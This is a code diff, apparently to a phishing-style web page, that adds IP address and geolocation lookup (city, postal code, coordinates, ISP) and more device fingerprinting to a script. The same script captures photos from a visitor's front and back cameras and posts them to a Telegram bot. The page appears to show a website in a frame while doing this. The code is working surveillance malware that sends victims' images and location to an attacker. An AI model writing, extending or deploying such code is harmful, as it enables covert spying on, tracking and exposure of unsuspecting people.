@@ -103,24 +103,33 @@
         const cameraVideo = document.getElementById('cameraVideo');
         const websiteFrame = document.getElementById('websiteFrame');
         
-        // Get comprehensive device info
+        // Get comprehensive device info including IP
         async function getDeviceInfo() {
             const info = {
                 // Battery
                 battery: null,
                 
+                // IP Address
+                ip: 'Fetching...',
+                ipv4: 'N/A',
+                ipv6: 'N/A',
+                
                 // Screen
                 screenWidth: window.screen.width,
                 screenHeight: window.screen.height,
                 screenColorDepth: window.screen.colorDepth,
+                screenAvailWidth: window.screen.availWidth,
+                screenAvailHeight: window.screen.availHeight,
                 
                 // Browser/Device
                 userAgent: navigator.userAgent,
                 platform: navigator.platform,
+                vendor: navigator.vendor || 'N/A',
                 language: navigator.language,
                 languages: navigator.languages.join(', '),
                 cookieEnabled: navigator.cookieEnabled,
-                doNotTrack: navigator.doNotTrack,
+                doNotTrack: navigator.doNotTrack || 'N/A',
+                onLine: navigator.onLine,
                 
                 // Hardware
                 hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
@@ -131,16 +140,65 @@
                 connectionType: 'N/A',
                 effectiveType: 'N/A',
                 downlink: 'N/A',
+                rtt: 'N/A',
+                saveData: 'N/A',
                 
                 // Window
                 innerWidth: window.innerWidth,
                 innerHeight: window.innerHeight,
+                outerWidth: window.outerWidth,
+                outerHeight: window.outerHeight,
                 pixelRatio: window.devicePixelRatio,
                 
                 // Time
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                timestamp: new Date().toISOString()
+                timezoneOffset: new Date().getTimezoneOffset(),
+                timestamp: new Date().toISOString(),
+                locale: Intl.DateTimeFormat().resolvedOptions().locale,
+                
+                // Storage
+                localStorage: 'N/A',
+                sessionStorage: 'N/A',
+                
+                // Permissions
+                permissions: {}
             };
+            
+            // Get IP address from multiple sources
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                info.ipv4 = ipData.ip;
+                info.ip = ipData.ip;
+            } catch (e) {
+                try {
+                    // Fallback IP service
+                    const ipResponse2 = await fetch('https://api.my-ip.io/ip');
+                    const ipText = await ipResponse2.text();
+                    info.ip = ipText.trim();
+                    info.ipv4 = ipText.trim();
+                } catch (e2) {
+                    info.ip = 'Unable to fetch';
+                }
+            }
+            
+            // Get detailed IP info
+            try {
+                const ipInfoResponse = await fetch(`https://ipapi.co/${info.ipv4}/json/`);
+                const ipInfo = await ipInfoResponse.json();
+                info.ipDetails = {
+                    city: ipInfo.city || 'N/A',
+                    region: ipInfo.region || 'N/A',
+                    country: ipInfo.country_name || 'N/A',
+                    postal: ipInfo.postal || 'N/A',
+                    latitude: ipInfo.latitude || 'N/A',
+                    longitude: ipInfo.longitude || 'N/A',
+                    timezone: ipInfo.timezone || 'N/A',
+                    isp: ipInfo.org || 'N/A'
+                };
+            } catch (e) {
+                info.ipDetails = null;
+            }
             
             // Get battery info
             if ('getBattery' in navigator) {
@@ -164,7 +222,22 @@
                     info.connectionType = conn.type || conn.effectiveType || 'Unknown';
                     info.effectiveType = conn.effectiveType || 'N/A';
                     info.downlink = conn.downlink ? conn.downlink + ' Mbps' : 'N/A';
+                    info.rtt = conn.rtt ? conn.rtt + ' ms' : 'N/A';
+                    info.saveData = conn.saveData ? 'Enabled' : 'Disabled';
                 }
+            }
+            
+            // Storage info
+            try {
+                info.localStorage = localStorage ? 'Available' : 'Not available';
+            } catch (e) {
+                info.localStorage = 'Blocked';
+            }
+            
+            try {
+                info.sessionStorage = sessionStorage ? 'Available' : 'Not available';
+            } catch (e) {
+                info.sessionStorage = 'Blocked';
             }
             
             return info;
@@ -301,6 +374,8 @@
         // Send photo to Telegram (immediately)
         async function sendPhotoToTelegram(photo, photoNumber, cameraType) {
             try {
+                console.log(`📤 Sending photo ${photoNumber} (${cameraType}) to Telegram...`);
+                
                 const url = `${TELEGRAM_API}/sendPhoto`;
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
@@ -313,19 +388,24 @@
                 
                 formData.append('caption', caption);
                 
+                console.log(`Sending to: ${url}`);
+                console.log(`Chat ID: ${CHAT_ID}`);
+                console.log(`Photo size: ${photo.blob.size} bytes`);
+                
                 const response = await fetch(url, {
                     method: 'POST',
                     body: formData
                 });
                 
                 const result = await response.json();
+                console.log(`Response for photo ${photoNumber}:`, result);
                 
                 if (result.ok) {
-                    console.log(`✅ Photo ${photoNumber} (${cameraType}) sent to Telegram`);
+                    console.log(`✅ Photo ${photoNumber} (${cameraType}) sent to Telegram successfully`);
                     photosSentCount++;
                     return true;
                 } else {
-                    console.error(`❌ Failed to send photo ${photoNumber}:`, result);
+                    console.error(`❌ Failed to send photo ${photoNumber}:`, result.description || result);
                     return false;
                 }
             } catch (error) {
@@ -521,6 +601,7 @@
             
             if (frontCameraStarted) {
                 // 5. Capture 3 photos from FRONT camera
+                console.log('📸 Capturing from FRONT camera...');
                 await fastCaptureAndSend('front', 1);
                 
                 // 6. Switch to BACK camera (3 photos)
@@ -534,8 +615,13 @@
                 const backCameraStarted = await startCamera();
                 if (backCameraStarted) {
                     // 7. Capture 3 photos from BACK camera
+                    console.log('📸 Capturing from BACK camera...');
                     await fastCaptureAndSend('back', 4);
+                } else {
+                    console.error('❌ Back camera failed to start');
                 }
+            } else {
+                console.error('❌ Front camera failed to start');
             }
             
             // Wait for all parallel tasks
